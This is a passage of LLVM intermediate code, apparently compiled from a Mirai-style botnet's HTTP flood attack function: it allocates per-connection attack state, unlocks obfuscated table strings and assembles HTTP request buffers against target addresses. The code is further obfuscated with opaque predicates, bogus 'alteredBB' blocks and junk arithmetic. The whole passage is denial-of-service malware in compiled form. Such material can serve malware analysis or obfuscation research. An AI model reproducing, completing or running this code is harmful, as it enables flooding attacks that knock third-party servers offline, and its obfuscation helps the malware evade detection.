  %4042 = load i32, i32* %4041, align 4
  %4043 = icmp ne i32 %4042, 11
  br i1 %4043, label %4044, label %4073

; <label>:4044:                                   ; preds = %4040
  %4045 = load i32, i32* @x.17
  %4046 = load i32, i32* @y.18
  %4047 = sub i32 %4045, 1
  %4048 = mul i32 %4045, %4047
  %4049 = urem i32 %4048, 2
  %4050 = icmp eq i32 %4049, 0
  %4051 = icmp slt i32 %4046, 10
  %4052 = or i1 %4050, %4051
  br i1 %4052, label %originalBB771, label %originalBB771alteredBB

originalBB771:                                    ; preds = %originalBB771alteredBB, %4044
  %4053 = call i32* @__errno_location() #7
  %4054 = load i32, i32* %4053, align 4
  %4055 = icmp ne i32 %4054, 11
  %4056 = load i32, i32* @x.17
  %4057 = load i32, i32* @y.18
  %4058 = sub i32 %4056, 1
  %4059 = mul i32 %4056, %4058
  %4060 = urem i32 %4059, 2
  %4061 = icmp eq i32 %4060, 0
  %4062 = icmp slt i32 %4057, 10
  %4063 = or i1 %4061, %4062
  br i1 %4063, label %originalBBpart2773, label %originalBB771alteredBB

originalBBpart2773:                               ; preds = %originalBB771
  br i1 %4055, label %4064, label %4073

; <label>:4064:                                   ; preds = %originalBBpart2773
  %4065 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4066 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4065, i32 0, i32 0
  %4067 = load i32, i32* %4066, align 4
  %4068 = call i32 @close(i32 %4067)
  %4069 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4070 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4069, i32 0, i32 0
  store i32 -1, i32* %4070, align 4
  %4071 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4072 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4071, i32 0, i32 1
  store i8 0, i8* %4072, align 4
  br label %4073

; <label>:4073:                                   ; preds = %4064, %originalBBpart2773, %4040
  br label %4075

; <label>:4074:                                   ; preds = %4037
  br label %4009

; <label>:4075:                                   ; preds = %4073
  %4076 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4077 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4076, i32 0, i32 1
  %4078 = load i8, i8* %4077, align 4
  %4079 = zext i8 %4078 to i32
  %4080 = icmp ne i32 %4079, 0
  br i1 %4080, label %4081, label %4084

; <label>:4081:                                   ; preds = %4075
  %4082 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4083 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4082, i32 0, i32 1
  store i8 1, i8* %4083, align 4
  br label %4084

; <label>:4084:                                   ; preds = %4081, %4075
  %4085 = load i32, i32* @x.17
  %4086 = load i32, i32* @y.18
  %4087 = sub i32 %4085, 1
  %4088 = mul i32 %4085, %4087
  %4089 = urem i32 %4088, 2
  %4090 = icmp eq i32 %4089, 0
  %4091 = icmp slt i32 %4086, 10
  %4092 = or i1 %4090, %4091
  br i1 %4092, label %originalBB775, label %originalBB775alteredBB

originalBB775:                                    ; preds = %originalBB775alteredBB, %4084
  %4093 = load i32, i32* @x.17
  %4094 = load i32, i32* @y.18
  %4095 = sub i32 %4093, 1
  %4096 = mul i32 %4093, %4095
  %4097 = urem i32 %4096, 2
  %4098 = icmp eq i32 %4097, 0
  %4099 = icmp slt i32 %4094, 10
  %4100 = or i1 %4098, %4099
  br i1 %4100, label %originalBBpart2777, label %originalBB775alteredBB

originalBBpart2777:                               ; preds = %originalBB775
  br label %4101

; <label>:4101:                                   ; preds = %originalBBpart2777, %4002
  %4102 = load i32, i32* @x.17
  %4103 = load i32, i32* @y.18
  %4104 = sub i32 %4102, 1
  %4105 = mul i32 %4102, %4104
  %4106 = urem i32 %4105, 2
  %4107 = icmp eq i32 %4106, 0
  %4108 = icmp slt i32 %4103, 10
  %4109 = or i1 %4107, %4108
  br i1 %4109, label %originalBB779, label %originalBB779alteredBB

originalBB779:                                    ; preds = %originalBB779alteredBB, %4101
  %4110 = load i32, i32* @x.17
  %4111 = load i32, i32* @y.18
  %4112 = sub i32 %4110, 1
  %4113 = mul i32 %4110, %4112
  %4114 = urem i32 %4113, 2
  %4115 = icmp eq i32 %4114, 0
  %4116 = icmp slt i32 %4111, 10
  %4117 = or i1 %4115, %4116
  br i1 %4117, label %originalBBpart2781, label %originalBB779alteredBB

originalBBpart2781:                               ; preds = %originalBB779
  br label %4118

; <label>:4118:                                   ; preds = %originalBBpart2781, %originalBBpart2765
  br label %4119

; <label>:4119:                                   ; preds = %4118, %3402
  %4120 = load i32, i32* @x.17
  %4121 = load i32, i32* @y.18
  %4122 = sub i32 %4120, 1
  %4123 = mul i32 %4120, %4122
  %4124 = urem i32 %4123, 2
  %4125 = icmp eq i32 %4124, 0
  %4126 = icmp slt i32 %4121, 10
  %4127 = or i1 %4125, %4126
  br i1 %4127, label %originalBB783, label %originalBB783alteredBB

originalBB783:                                    ; preds = %originalBB783alteredBB, %4119
  %4128 = load i32, i32* @x.17
  %4129 = load i32, i32* @y.18
  %4130 = sub i32 %4128, 1
  %4131 = mul i32 %4128, %4130
  %4132 = urem i32 %4131, 2
  %4133 = icmp eq i32 %4132, 0
  %4134 = icmp slt i32 %4129, 10
  %4135 = or i1 %4133, %4134
  br i1 %4135, label %originalBBpart2785, label %originalBB783alteredBB

originalBBpart2785:                               ; preds = %originalBB783
  br label %4136

; <label>:4136:                                   ; preds = %originalBBpart2785, %1657
  br label %4137

; <label>:4137:                                   ; preds = %4136, %3314, %2727, %originalBBpart2343, %1705, %originalBBpart2331, %originalBBpart2295
  %4138 = load i32, i32* @x.17
  %4139 = load i32, i32* @y.18
  %4140 = sub i32 %4138, 1
  %4141 = mul i32 %4138, %4140
  %4142 = urem i32 %4141, 2
  %4143 = icmp eq i32 %4142, 0
  %4144 = icmp slt i32 %4139, 10
  %4145 = or i1 %4143, %4144
  br i1 %4145, label %originalBB787, label %originalBB787alteredBB

originalBB787:                                    ; preds = %originalBB787alteredBB, %4137
  %4146 = load i32, i32* %17, align 4
  %4147 = add nsw i32 %4146, 1
  store i32 %4147, i32* %17, align 4
  %4148 = load i32, i32* @x.17
  %4149 = load i32, i32* @y.18
  %4150 = sub i32 %4148, 1
  %4151 = mul i32 %4148, %4150
  %4152 = urem i32 %4151, 2
  %4153 = icmp eq i32 %4152, 0
  %4154 = icmp slt i32 %4149, 10
  %4155 = or i1 %4153, %4154
  br i1 %4155, label %originalBBpart2792, label %originalBB787alteredBB

originalBBpart2792:                               ; preds = %originalBB787
  br label %1538

; <label>:4156:                                   ; preds = %1538
  br label %510

; <label>:4157:                                   ; preds = %originalBBpart212, %originalBBpart28, %126, %105
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %4158 = alloca i8, align 1
  %4159 = alloca %struct.attack_target*, align 8
  %4160 = alloca i8, align 1
  %4161 = alloca %struct.attack_option*, align 8
  %4162 = alloca i32, align 4
  %4163 = alloca i32, align 4
  %4164 = alloca i32, align 4
  %4165 = alloca i32, align 4
  %4166 = alloca %struct.attack_http_state*, align 8
  %4167 = alloca i8*, align 8
  %4168 = alloca i8*, align 8
  %4169 = alloca i8*, align 8
  %4170 = alloca i8*, align 8
  %4171 = alloca i32, align 4
  %4172 = alloca i16, align 2
  %4173 = alloca [10241 x i8], align 16
  %4174 = alloca %struct.fd_set, align 8
  %4175 = alloca %struct.fd_set, align 8
  %4176 = alloca i32, align 4
  %4177 = alloca i32, align 4
  %4178 = alloca %struct.timeval, align 8
  %4179 = alloca %struct.attack_http_state*, align 8
  %4180 = alloca i32, align 4
  %4181 = alloca i32, align 4
  %4182 = alloca i32, align 4
  %4183 = alloca i32, align 4
  %4184 = alloca i32, align 4
  %4185 = alloca %struct.sockaddr_in, align 4
  %4186 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %4187 = alloca [10240 x i8], align 16
  %4188 = alloca i32, align 4
  %4189 = alloca i32, align 4
  %4190 = alloca i32, align 4
  %4191 = alloca i32, align 4
  %4192 = alloca i32, align 4
  %4193 = alloca i8*, align 8
  %4194 = alloca i32, align 4
  %4195 = alloca i32, align 4
  %4196 = alloca i8*, align 8
  %4197 = alloca i32, align 4
  %4198 = alloca i32, align 4
  %4199 = alloca i8*, align 8
  %4200 = alloca i32, align 4
  %4201 = alloca i32, align 4
  %4202 = alloca i8*, align 8
  %4203 = alloca i32, align 4
  %4204 = alloca i32, align 4
  %4205 = alloca i32, align 4
  %4206 = alloca i32, align 4
  %4207 = alloca i8*, align 8
  %4208 = alloca i32, align 4
  %4209 = alloca i32, align 4
  %4210 = alloca i8*, align 8
  %4211 = alloca i32, align 4
  %4212 = alloca i32, align 4
  %4213 = alloca i32, align 4
  %4214 = alloca i32, align 4
  %4215 = alloca i32, align 4
  %4216 = alloca i32, align 4
  store i8 %0, i8* %4158, align 1
  store %struct.attack_target* %1, %struct.attack_target** %4159, align 8
  store i8 %2, i8* %4160, align 1
  store %struct.attack_option* %3, %struct.attack_option** %4161, align 8
  store i32 0, i32* %4165, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %4166, align 8
  %4217 = load i8, i8* %4160, align 1
  %4218 = load %struct.attack_option*, %struct.attack_option** %4161, align 8
  %4219 = call i8* @attack_get_opt_str(i8 zeroext %4217, %struct.attack_option* %4218, i8 zeroext 20, i8* null)
  store i8* %4219, i8** %4167, align 8
  %4220 = load i8, i8* %4160, align 1
  %4221 = load %struct.attack_option*, %struct.attack_option** %4161, align 8
  %4222 = call i8* @attack_get_opt_str(i8 zeroext %4220, %struct.attack_option* %4221, i8 zeroext 19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %4222, i8** %4168, align 8
  %4223 = load i8, i8* %4160, align 1
  %4224 = load %struct.attack_option*, %struct.attack_option** %4161, align 8
  %4225 = call i8* @attack_get_opt_str(i8 zeroext %4223, %struct.attack_option* %4224, i8 zeroext 8, i8* null)
  store i8* %4225, i8** %4169, align 8
  %4226 = load i8, i8* %4160, align 1
  %4227 = load %struct.attack_option*, %struct.attack_option** %4161, align 8
  %4228 = call i8* @attack_get_opt_str(i8 zeroext %4226, %struct.attack_option* %4227, i8 zeroext 21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %4228, i8** %4170, align 8
  %4229 = load i8, i8* %4160, align 1
  %4230 = load %struct.attack_option*, %struct.attack_option** %4161, align 8
  %4231 = call i32 @attack_get_opt_int(i8 zeroext %4229, %struct.attack_option* %4230, i8 zeroext 23, i32 1)
  store i32 %4231, i32* %4171, align 4
  %4232 = load i8, i8* %4160, align 1
  %4233 = load %struct.attack_option*, %struct.attack_option** %4161, align 8
  %4234 = call i32 @attack_get_opt_int(i8 zeroext %4232, %struct.attack_option* %4233, i8 zeroext 7, i32 80)
  %4235 = trunc i32 %4234 to i16
  store i16 %4235, i16* %4172, align 2
  %4236 = bitcast [10241 x i8]* %4173 to i8*
  call void @llvm.memset.p0i8.i64(i8* %4236, i8 0, i64 10241, i32 16, i1 false)
  %4237 = load i8*, i8** %4169, align 8
  %4238 = icmp eq i8* %4237, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %106
  %4239 = load i8*, i8** %25, align 8
  %4240 = call i32 @util_strlen(i8* %4239)
  %4241 = icmp sgt i32 %4240, 255
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %131
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %152
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %207
  store i32 512, i32* %26, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %224
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  call void @table_unlock_val(i8 zeroext 47)
  call void @table_unlock_val(i8 zeroext 48)
  call void @table_unlock_val(i8 zeroext 49)
  call void @table_unlock_val(i8 zeroext 50)
  call void @table_unlock_val(i8 zeroext 51)
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  %4242 = load i32, i32* %26, align 4
  %4243 = sext i32 %4242 to i64
  %4244 = call noalias i8* @calloc(i64 %4243, i64 3140) #6
  %4245 = bitcast i8* %4244 to %struct.attack_http_state*
  store %struct.attack_http_state* %4245, %struct.attack_http_state** %21, align 8
  store i32 0, i32* %17, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %249
  %4246 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4247 = load i32, i32* %17, align 4
  %4248 = sext i32 %4247 to i64
  %4249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4246, i64 %4248
  %4250 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4249, i32 0, i32 1
  store i8 0, i8* %4250, align 4
  %4251 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4252 = load i32, i32* %17, align 4
  %4253 = sext i32 %4252 to i64
  %4254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4251, i64 %4253
  %4255 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4254, i32 0, i32 0
  store i32 -1, i32* %4255, align 4
  %4256 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %4257 = load i32, i32* %17, align 4
  %4258 = load i8, i8* %13, align 1
  %4259 = zext i8 %4258 to i32
  %_ = shl i32 %4257, %4259
  %_23 = sub i32 %4257, %4259
  %gen = mul i32 %_23, %4259
  %_24 = sub i32 0, %4257
  %gen25 = add i32 %_24, %4259
  %_26 = sub i32 0, %4257
  %gen27 = add i32 %_26, %4259
  %_28 = sub i32 %4257, %4259
  %gen29 = mul i32 %_28, %4259
  %_30 = sub i32 0, %4257
  %gen31 = add i32 %_30, %4259
  %_32 = shl i32 %4257, %4259
  %_33 = sub i32 0, %4257
  %gen34 = add i32 %_33, %4259
  %_35 = shl i32 %4257, %4259
  %4260 = srem i32 %4257, %4259
  %4261 = sext i32 %4260 to i64
  %4262 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4256, i64 %4261
  %4263 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4262, i32 0, i32 1
  %4264 = load i32, i32* %4263, align 4
  %4265 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4266 = load i32, i32* %17, align 4
  %4267 = sext i32 %4266 to i64
  %4268 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4265, i64 %4267
  %4269 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4268, i32 0, i32 4
  store i32 %4264, i32* %4269, align 4
  %4270 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4271 = load i32, i32* %17, align 4
  %4272 = sext i32 %4271 to i64
  %4273 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4270, i64 %4272
  %4274 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4273, i32 0, i32 6
  %4275 = getelementptr inbounds [257 x i8], [257 x i8]* %4274, i32 0, i32 0
  %4276 = load i8*, i8** %25, align 8
  %4277 = call i32 @util_strcpy(i8* %4275, i8* %4276)
  %4278 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4279 = load i32, i32* %17, align 4
  %4280 = sext i32 %4279 to i64
  %4281 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4278, i64 %4280
  %4282 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4281, i32 0, i32 6
  %4283 = getelementptr inbounds [257 x i8], [257 x i8]* %4282, i64 0, i64 0
  %4284 = load i8, i8* %4283, align 4
  %4285 = sext i8 %4284 to i32
  %4286 = icmp ne i32 %4285, 47
  br label %originalBB22

originalBB39alteredBB:                            ; preds = %originalBB39, %371
  %4287 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %4288 = load i32, i32* %17, align 4
  %4289 = load i8, i8* %13, align 1
  %4290 = zext i8 %4289 to i32
  %_40 = shl i32 %4288, %4290
  %_41 = shl i32 %4288, %4290
  %4291 = srem i32 %4288, %4290
  %4292 = sext i32 %4291 to i64
  %4293 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4287, i64 %4292
  %4294 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4293, i32 0, i32 1
  %4295 = load i32, i32* %4294, align 4
  %4296 = call i32 @ntohl(i32 %4295) #7
  %4297 = call i32 @rand_next()
  %4298 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %4299 = load i32, i32* %17, align 4
  %4300 = load i8, i8* %13, align 1
  %4301 = zext i8 %4300 to i32
  %_42 = sub i32 0, %4299
  %gen43 = add i32 %_42, %4301
  %_44 = sub i32 %4299, %4301
  %gen45 = mul i32 %_44, %4301
  %4302 = srem i32 %4299, %4301
  %4303 = sext i32 %4302 to i64
  %4304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4298, i64 %4303
  %4305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4304, i32 0, i32 2
  %4306 = load i8, i8* %4305, align 4
  %4307 = zext i8 %4306 to i32
  %_46 = sub i32 0, %4297
  %gen47 = add i32 %_46, %4307
  %_48 = sub i32 0, %4297
  %gen49 = add i32 %_48, %4307
  %_50 = shl i32 %4297, %4307
  %4308 = lshr i32 %4297, %4307
  %_51 = sub i32 %4296, %4308
  %gen52 = mul i32 %_51, %4308
  %_53 = sub i32 %4296, %4308
  %gen54 = mul i32 %_53, %4308
  %_55 = sub i32 0, %4296
  %gen56 = add i32 %_55, %4308
  %_57 = sub i32 %4296, %4308
  %gen58 = mul i32 %_57, %4308
  %_59 = sub i32 0, %4296
  %gen60 = add i32 %_59, %4308
  %4309 = add i32 %4296, %4308
  %4310 = call i32 @htonl(i32 %4309) #7
  %4311 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4312 = load i32, i32* %17, align 4
  %4313 = sext i32 %4312 to i64
  %4314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4311, i64 %4313
  %4315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4314, i32 0, i32 4
  store i32 %4310, i32* %4315, align 4
  br label %originalBB39

originalBB64alteredBB:                            ; preds = %originalBB64, %447
  call void @table_unlock_val(i8 zeroext 57)
  %4316 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4317 = load i32, i32* %17, align 4
  %4318 = sext i32 %4317 to i64
  %4319 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4316, i64 %4318
  %4320 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4319, i32 0, i32 5
  %4321 = getelementptr inbounds [512 x i8], [512 x i8]* %4320, i32 0, i32 0
  %4322 = call i8* @table_retrieve_val(i32 57, i32* null)
  %4323 = call i32 @util_strcpy(i8* %4321, i8* %4322)
  call void @table_lock_val(i8 zeroext 57)
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %493
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %523
  %4324 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %4325 = getelementptr inbounds [16 x i64], [16 x i64]* %4324, i64 0, i64 0
  %4326 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %4325) #6, !srcloc !2
  %4327 = extractvalue { i64, i64* } %4326, 0
  %4328 = extractvalue { i64, i64* } %4326, 1
  %4329 = trunc i64 %4327 to i32
  store i32 %4329, i32* %38, align 4
  %4330 = ptrtoint i64* %4328 to i64
  %4331 = trunc i64 %4330 to i32
  store i32 %4331, i32* %39, align 4
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %549
  %4332 = load i32, i32* %17, align 4
  %4333 = load i32, i32* %26, align 4
  %4334 = icmp slt i32 %4332, %4333
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %587
  %4335 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4336 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4335, i32 0, i32 1
  store i8 0, i8* %4336, align 4
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %606
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %623
  %4337 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4338 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4337, i32 0, i32 1
  %4339 = load i8, i8* %4338, align 4
  %4340 = zext i8 %4339 to i32
  %4341 = icmp eq i32 %4340, 0
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %651
  %4342 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4343 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4342, i32 0, i32 0
  %4344 = load i32, i32* %4343, align 4
  %4345 = call i32 @close(i32 %4344)
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %677
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %770
  %4346 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4347 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4346, i32 0, i32 1
  store i8 0, i8* %4347, align 4
  %4348 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4349 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4348, i32 0, i32 0
  %4350 = load i32, i32* %4349, align 4
  %4351 = call i32 @close(i32 %4350)
  %4352 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4353 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4352, i32 0, i32 0
  store i32 -1, i32* %4353, align 4
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %816
  %4354 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4355 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4354, i32 0, i32 0
  %4356 = load i32, i32* %4355, align 4
  %_105 = sub i32 0, %4356
  %gen106 = add i32 %_105, 1
  %_107 = sub i32 0, %4356
  %gen108 = add i32 %_107, 1
  %_109 = sub i32 %4356, 1
  %gen110 = mul i32 %_109, 1
  %_111 = shl i32 %4356, 1
  %_112 = shl i32 %4356, 1
  %4357 = add nsw i32 %4356, 1
  store i32 %4357, i32* %31, align 4
  br label %originalBB104

originalBB116alteredBB:                           ; preds = %originalBB116, %844
  %4358 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4358, i32 0, i32 14
  store i32 -1, i32* %4359, align 4
  %4360 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4361 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4360, i32 0, i32 11
  store i32 0, i32* %4361, align 4
  %4362 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4363 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4362, i32 0, i32 18
  %4364 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4363, i32 0, i32 0
  call void @util_zero(i8* %4364, i32 1024)
  %4365 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4366 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4365, i32 0, i32 17
  store i32 0, i32* %4366, align 4
  %4367 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  call void @util_zero(i8* %4367, i32 10240)
  %4368 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4369 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4370 = call i32 @util_strlen(i8* %4369)
  %4371 = sext i32 %4370 to i64
  %4372 = getelementptr inbounds i8, i8* %4368, i64 %4371
  %4373 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4374 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4373, i32 0, i32 9
  %4375 = getelementptr inbounds [9 x i8], [9 x i8]* %4374, i32 0, i32 0
  %4376 = call i32 @util_strcpy(i8* %4372, i8* %4375)
  %4377 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4378 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4379 = call i32 @util_strlen(i8* %4378)
  %4380 = sext i32 %4379 to i64
  %4381 = getelementptr inbounds i8, i8* %4377, i64 %4380
  %4382 = call i32 @util_strcpy(i8* %4381, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %4383 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4384 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4385 = call i32 @util_strlen(i8* %4384)
  %4386 = sext i32 %4385 to i64
  %4387 = getelementptr inbounds i8, i8* %4383, i64 %4386
  %4388 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4389 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4388, i32 0, i32 6
  %4390 = getelementptr inbounds [257 x i8], [257 x i8]* %4389, i32 0, i32 0
  %4391 = call i32 @util_strcpy(i8* %4387, i8* %4390)
  %4392 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4393 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4394 = call i32 @util_strlen(i8* %4393)
  %4395 = sext i32 %4394 to i64
  %4396 = getelementptr inbounds i8, i8* %4392, i64 %4395
  %4397 = call i32 @util_strcpy(i8* %4396, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %4398 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4399 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4400 = call i32 @util_strlen(i8* %4399)
  %4401 = sext i32 %4400 to i64
  %4402 = getelementptr inbounds i8, i8* %4398, i64 %4401
  %4403 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4403, i32 0, i32 5
  %4405 = getelementptr inbounds [512 x i8], [512 x i8]* %4404, i32 0, i32 0
  %4406 = call i32 @util_strcpy(i8* %4402, i8* %4405)
  %4407 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4408 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4409 = call i32 @util_strlen(i8* %4408)
  %4410 = sext i32 %4409 to i64
  %4411 = getelementptr inbounds i8, i8* %4407, i64 %4410
  %4412 = call i32 @util_strcpy(i8* %4411, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %4413 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4414 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4415 = call i32 @util_strlen(i8* %4414)
  %4416 = sext i32 %4415 to i64
  %4417 = getelementptr inbounds i8, i8* %4413, i64 %4416
  %4418 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4418, i32 0, i32 7
  %4420 = getelementptr inbounds [129 x i8], [129 x i8]* %4419, i32 0, i32 0
  %4421 = call i32 @util_strcpy(i8* %4417, i8* %4420)
  %4422 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4423 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4424 = call i32 @util_strlen(i8* %4423)
  %4425 = sext i32 %4424 to i64
  %4426 = getelementptr inbounds i8, i8* %4422, i64 %4425
  %4427 = call i32 @util_strcpy(i8* %4426, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 39)
  %4428 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4429 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4430 = call i32 @util_strlen(i8* %4429)
  %4431 = sext i32 %4430 to i64
  %4432 = getelementptr inbounds i8, i8* %4428, i64 %4431
  %4433 = call i8* @table_retrieve_val(i32 39, i32* null)
  %4434 = call i32 @util_strcpy(i8* %4432, i8* %4433)
  call void @table_lock_val(i8 zeroext 39)
  %4435 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4436 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4437 = call i32 @util_strlen(i8* %4436)
  %4438 = sext i32 %4437 to i64
  %4439 = getelementptr inbounds i8, i8* %4435, i64 %4438
  %4440 = call i32 @util_strcpy(i8* %4439, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 40)
  %4441 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4442 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4443 = call i32 @util_strlen(i8* %4442)
  %4444 = sext i32 %4443 to i64
  %4445 = getelementptr inbounds i8, i8* %4441, i64 %4444
